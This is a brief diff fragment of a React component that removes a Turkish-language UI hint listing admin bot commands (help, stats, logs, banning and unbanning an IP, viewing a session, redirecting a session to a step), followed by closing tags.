-          💡 Bot komutları: <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/help</code> • <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/stats</code> • <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/logs 20</code> • <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/ban 1.2.3.4</code> • <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/unban 1.2.3.4</code> • <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/session ID</code> • <code className="font-mono px-1.5 py-0.5 rounded bg-black/10">/redirect ID step</code>
-        </div>
-      </div>
     </div>
   );
 }
